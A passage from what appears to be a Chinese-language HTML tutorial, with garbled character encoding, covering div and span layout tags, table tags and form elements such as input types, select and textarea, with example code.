class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ•ˆæœï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4d2ca694e5a1c402d403f1a675b553da--1cdb--image-20231121183250787.png" alt="image-20231121183250787"></p>
<h4 id="â‘¡å¸ƒå±€æ ‡ç­¾"><a href="#â‘¡å¸ƒå±€æ ‡ç­¾" class="headerlink" title="â‘¡å¸ƒå±€æ ‡ç­¾"></a>â‘¡å¸ƒå±€æ ‡ç­¾</h4><ul>
<li><p>å¸ƒå±€æ ‡ç­¾ï¼šå®é™…å¼€å‘ç½‘é¡µä¸­ï¼Œä¼šå¤§é‡é¢‘ç¹çš„ä½¿ç”¨ div å’Œ span è¿™ä¸¤ä¸ªæ²¡æœ‰è¯­ä¹‰çš„å¸ƒå±€æ ‡ç­¾ã€‚</p>
</li>
<li><p>æ ‡ç­¾ï¼š<div> <span></p>
</li>
<li><p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li><p>divæ ‡ç­¾ï¼š</p>
<ul>
<li><p>ä¸€è¡Œåªæ˜¾ç¤ºä¸€ä¸ªï¼ˆç‹¬å ä¸€è¡Œï¼‰</p>
</li>
<li><p>å®½åº¦é»˜è®¤æ˜¯çˆ¶å…ƒç´ çš„å®½åº¦ï¼Œé«˜åº¦é»˜è®¤ç”±å†…å®¹æ’‘å¼€</p>
</li>
<li><p>å¯ä»¥è®¾ç½®å®½é«˜ï¼ˆwidthã€heightï¼‰</p>
</li>
</ul>
</li>
<li><p>spanæ ‡ç­¾ï¼š</p>
<ul>
<li><p>ä¸€è¡Œå¯ä»¥æ˜¾ç¤ºå¤šä¸ª</p>
</li>
<li><p>å®½åº¦å’Œé«˜åº¦é»˜è®¤ç”±å†…å®¹æ’‘å¼€</p>
</li>
<li><p>ä¸å¯ä»¥è®¾ç½®å®½é«˜ï¼ˆwidthã€heightï¼‰</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-è¡¨æ ¼æ ‡ç­¾"><a href="#5-è¡¨æ ¼æ ‡ç­¾" class="headerlink" title="5).è¡¨æ ¼æ ‡ç­¾"></a>5).è¡¨æ ¼æ ‡ç­¾</h3><p><strong>æ ‡ç­¾ï¼š</strong></p>
<ul>
<li><p>&lt;table&gt; : ç”¨äºå®šä¹‰æ•´ä¸ªè¡¨æ ¼, å¯ä»¥åŒ…è£¹å¤šä¸ª &lt;tr&gt;ï¼Œ å¸¸ç”¨å±æ€§å¦‚ä¸‹ï¼š </p>
<ul>
<li>borderï¼šè§„å®šè¡¨æ ¼è¾¹æ¡†çš„å®½åº¦</li>
<li>widthï¼šè§„å®šè¡¨æ ¼çš„å®½åº¦</li>
<li>cellspacing: è§„å®šå•å…ƒä¹‹é—´çš„ç©ºé—´</li>
</ul>
</li>
<li><p>&lt;tr&gt; : è¡¨æ ¼çš„è¡Œï¼Œå¯ä»¥åŒ…è£¹å¤šä¸ª &lt;td&gt;  </p>
</li>
<li><p>&lt;td&gt; : è¡¨æ ¼å•å…ƒæ ¼(æ™®é€š)ï¼Œå¯ä»¥åŒ…è£¹å†…å®¹ , å¦‚æœæ˜¯è¡¨å¤´å•å…ƒæ ¼ï¼Œå¯ä»¥æ›¿æ¢ä¸º &lt;th&gt;</p>
</li>
</ul>
<p><strong>æ¼”ç¤ºï¼š</strong></p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-è¡¨æ ¼<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center; <span class="comment">/* å•å…ƒæ ¼å†…å®¹å±…ä¸­å±•ç¤º */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>åºå·<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>å“ç‰ŒLogo<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>å“ç‰Œåç§°<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>ä¼ä¸šåç§°<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/huawei.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>åä¸º<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/alibaba.jpg&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>é˜¿é‡Œ<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€æµè§ˆå™¨ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/582d460a041f8a2b306cebd22a6333f9--f915--image-20231121183451283.png" alt="image-20231121183451283"></p>
<p>æ•´åˆè¡¨æ ¼ä½¿ç”¨ table æ ‡ç­¾åŒ…è£¹ , å…¶ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½æ˜¯ä¸€ä¸ª tr , æ¯ä¸€è¡Œä¸­çš„æ¯ä¸€ä¸ªå•å…ƒæ ¼éƒ½æ˜¯ä¸€ä¸ª td , è€Œå¦‚æœæ˜¯è¡¨å¤´å•å…ƒæ ¼, å¯ä»¥ä½¿ç”¨ th (å…·æœ‰åŠ ç²—å±…ä¸­å±•ç¤ºçš„æ•ˆæœ)ã€‚</p>
<h3 id="6-è¡¨å•æ ‡ç­¾ï¼ˆæ•°æ®æäº¤ï¼‰"><a href="#6-è¡¨å•æ ‡ç­¾ï¼ˆæ•°æ®æäº¤ï¼‰" class="headerlink" title="6).è¡¨å•æ ‡ç­¾ï¼ˆæ•°æ®æäº¤ï¼‰"></a>6).è¡¨å•æ ‡ç­¾ï¼ˆæ•°æ®æäº¤ï¼‰</h3><p>é‚£è¡¨å•å‘¢,åœ¨æˆ‘ä»¬æ—¥å¸¸çš„ä¸Šç½‘çš„è¿‡ç¨‹ä¸­,åŸºæœ¬ä¸Šæ¯å¤©éƒ½ä¼šé‡åˆ°ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬ç»å¸¸åœ¨è®¿é—®ç½‘ç«™æ—¶ï¼Œå‡ºç°çš„ç™»å½•é¡µé¢ã€æ³¨å†Œé¡µé¢ã€ä¸ªäººä¿¡æ¯æäº¤é¡µé¢ï¼Œå…¶å®éƒ½æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„è¡¨å• ã€‚ å½“æˆ‘ä»¬åœ¨è¿™äº›è¡¨å•ä¸­å½•å…¥æ•°æ®ä¹‹åï¼Œä¸€ç‚¹å‡» â€œæäº¤â€ï¼Œå°±ä¼šå°†è¡¨å•ä¸­æˆ‘ä»¬å¡«å†™çš„æ•°æ®é‡‡é›†åˆ°ï¼Œå¹¶æäº¤ï¼Œ é‚£å…¶å®è¿™ä¸ªæ•°æ®å‘¢ï¼Œä¸€èˆ¬ä¼šæäº¤åˆ°æœåŠ¡ç«¯ï¼Œæœ€ç»ˆä¿å­˜åœ¨æ•°æ®åº“ä¸­ ï¼ˆåé¢çš„è¯¾ç¨‹ä¸­ä¼šè®²åˆ°ï¼‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/158ab888ad88adfdda5cce236171acbc--b1b4--image-20231121183623494.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f0994b8edc9b5e7ce1a8ad860729d313--0da3--image-20231121183653494.png" alt="image-20231121183653494"></p>
<p>é‚£å…¶å®ï¼Œä¸Šè¿°çš„æ•´ä¸ªçª—å£æ˜¯ä¸€ä¸ªè¡¨å•ï¼Œè€Œè¡¨å•æ˜¯ä¸€é¡¹ä¸€é¡¹çš„ï¼Œè¿™ä¸ªæˆ‘ä»¬ç§°ä¸ºè¡¨å•é¡¹ æˆ– è¡¨å•å…ƒç´ ã€‚</p>
<ul>
<li><p>è¡¨å•åœºæ™¯: è¡¨å•å°±æ˜¯åœ¨ç½‘é¡µä¸­è´Ÿè´£æ•°æ®é‡‡é›†åŠŸèƒ½çš„ï¼Œå¦‚ï¼šæ³¨å†Œã€ç™»å½•çš„è¡¨å•ã€‚ </p>
</li>
<li><p>è¡¨å•æ ‡ç­¾: &lt;form&gt;</p>
</li>
<li><p>è¡¨å•å±æ€§:</p>
<ul>
<li>action: è§„å®šè¡¨å•æäº¤æ—¶ï¼Œå‘ä½•å¤„å‘é€è¡¨å•æ•°æ®ï¼Œè¡¨å•æäº¤çš„URLã€‚</li>
<li>method: è§„å®šç”¨äºå‘é€è¡¨å•æ•°æ®çš„æ–¹å¼ï¼Œå¸¸è§ä¸ºï¼š GETã€POSTã€‚<ul>
<li>GETï¼šè¡¨å•æ•°æ®æ˜¯æ‹¼æ¥åœ¨urlåé¢çš„ï¼Œ å¦‚ï¼š xxxxxxxxxxx?username&#x3D;Tom&amp;age&#x3D;12ï¼Œurlä¸­èƒ½æºå¸¦çš„è¡¨å•æ•°æ®å¤§å°æ˜¯æœ‰é™åˆ¶çš„ã€‚</li>
<li>POSTï¼š è¡¨å•æ•°æ®æ˜¯åœ¨è¯·æ±‚ä½“ï¼ˆæ¶ˆæ¯ä½“ï¼‰ä¸­æºå¸¦çš„ï¼Œå¤§å°æ²¡æœ‰é™åˆ¶ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p>è¡¨å•é¡¹æ ‡ç­¾: ä¸åŒç±»å‹çš„inputå…ƒç´ ã€ä¸‹æ‹‰åˆ—è¡¨ã€æ–‡æœ¬åŸŸç­‰ã€‚</p>
<ul>
<li>input: å®šä¹‰è¡¨å•é¡¹ï¼Œé€šè¿‡typeå±æ€§æ§åˆ¶è¾“å…¥å½¢å¼</li>
<li>select: å®šä¹‰ä¸‹æ‹‰åˆ—è¡¨</li>
<li>textarea: å®šä¹‰æ–‡æœ¬åŸŸ</li>
</ul>
</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-è¡¨å•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    formè¡¨å•å±æ€§: </span></span><br><span class="line"><span class="comment">        action: è¡¨å•æäº¤çš„url, å¾€ä½•å¤„æäº¤æ•°æ® . å¦‚æœä¸æŒ‡å®š, é»˜è®¤æäº¤åˆ°å½“å‰é¡µé¢</span></span><br><span class="line"><span class="comment">        method: è¡¨å•çš„æäº¤æ–¹å¼ .</span></span><br><span class="line"><span class="comment">            get: åœ¨urlåé¢æ‹¼æ¥è¡¨å•æ•°æ®, æ¯”å¦‚: ?username=Tom&amp;age=12 , urlé•¿åº¦æœ‰é™åˆ¶ . é»˜è®¤å€¼</span></span><br><span class="line"><span class="comment">            post: åœ¨æ¶ˆæ¯ä½“(è¯·æ±‚ä½“)ä¸­ä¼ é€’çš„, å‚æ•°å¤§å°æ— é™åˆ¶çš„.</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get/post&quot;</span>&gt;</span>   #è¡¨å•æäº¤æ–¹å¼çš„ä¿®æ”¹</span><br><span class="line">        ç”¨æˆ·å: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        å¹´é¾„: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¡¨å•ä¸­çš„æ‰€æœ‰è¡¨å•é¡¹ï¼Œè¦æƒ³èƒ½å¤Ÿæ­£å¸¸çš„é‡‡é›†æ•°æ®ï¼Œåœ¨æäº¤çš„æ—¶å€™èƒ½æäº¤åˆ°æœåŠ¡ç«¯ï¼Œè¡¨å•é¡¹å¿…é¡»æŒ‡å®šnameå±æ€§ã€‚ å¦åˆ™ï¼Œæ— æ³•æäº¤è¯¥è¡¨å•é¡¹ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-è¡¨å•çš„æ‹“å±•ä½¿ç”¨"><a href="#7-è¡¨å•çš„æ‹“å±•ä½¿ç”¨" class="headerlink" title="7).è¡¨å•çš„æ‹“å±•ä½¿ç”¨"></a>7).è¡¨å•çš„æ‹“å±•ä½¿ç”¨</h3><p>åœ¨ä¸€ä¸ªè¡¨å•ä¸­ï¼Œå¯ä»¥å­˜åœ¨å¾ˆå¤šçš„è¡¨å•é¡¹ï¼Œè€Œè™½ç„¶è¡¨å•é¡¹çš„å½¢å¼å„å¼å„æ ·ï¼Œä½†æ˜¯è¡¨å•é¡¹çš„æ ‡ç­¾å…¶å®å°±åªæœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li><p>&lt;input&gt;: è¡¨å•é¡¹ , é€šè¿‡typeå±æ€§æ§åˆ¶è¾“å…¥å½¢å¼ã€‚</p>
<table>
<thead>
<tr>
<th>typeå–å€¼</th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>é»˜è®¤å€¼ï¼Œå®šä¹‰å•è¡Œçš„è¾“å…¥å­—æ®µ</td>
</tr>
<tr>
<td>password</td>
<td>å®šä¹‰å¯†ç å­—æ®µ</td>
</tr>
<tr>
<td>radio</td>
<td>å®šä¹‰å•é€‰æŒ‰é’®</td>
</tr>
<tr>
<td>checkbox</td>
<td>å®šä¹‰å¤é€‰æ¡†</td>
</tr>
<tr>
<td>file</td>
<td>å®šä¹‰æ–‡ä»¶ä¸Šä¼ æŒ‰é’®</td>
</tr>
<tr>
<td>date&#x2F;time&#x2F;datetime-local</td>
<td>å®šä¹‰æ—¥æœŸ&#x2F;æ—¶é—´&#x2F;æ—¥æœŸæ—¶é—´</td>
</tr>
<tr>
<td>number</td>
<td>å®šä¹‰æ•°å­—è¾“å…¥æ¡†</td>
</tr>
<tr>
<td>email</td>
<td>å®šä¹‰é‚®ä»¶è¾“å…¥æ¡†</td>
</tr>
<tr>
<td>hidden</td>
<td>å®šä¹‰éšè—åŸŸ</td>
</tr>
<tr>
<td>submit &#x2F; reset &#x2F; button</td>
<td>å®šä¹‰æäº¤æŒ‰é’® &#x2F; é‡ç½®æŒ‰é’® &#x2F; å¯ç‚¹å‡»æŒ‰é’®</td>
</tr>
</tbody></table>
</li>
<li><p>&lt;select&gt;: å®šä¹‰ä¸‹æ‹‰åˆ—è¡¨, &lt;option&gt; å®šä¹‰åˆ—è¡¨é¡¹</p>
</li>
<li><p>&lt;textarea&gt;: æ–‡æœ¬åŸŸ</p>
</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨å•é¡¹çš„htmlæ–‡ä»¶ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-è¡¨å•é¡¹æ ‡ç­¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- value: è¡¨å•é¡¹æäº¤çš„å€¼ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">     å§“å: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     å¯†ç : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">     æ€§åˆ«: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span> ç”·</span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span> å¥³ <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     çˆ±å¥½: <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span> java <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span> game <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sing&quot;</span>&gt;</span> sing <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     å›¾åƒ: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     ç”Ÿæ—¥: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     æ—¶é—´: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     æ—¥æœŸæ—¶é—´: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datetime&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     é‚®ç®±: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     å¹´é¾„: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     å­¦å†: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;degree&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>----------- è¯·é€‰æ‹© -----------<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>å¤§ä¸“<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>æœ¬ç§‘<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>ç¡•å£«<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>åšå£«<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     æè¿°: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span 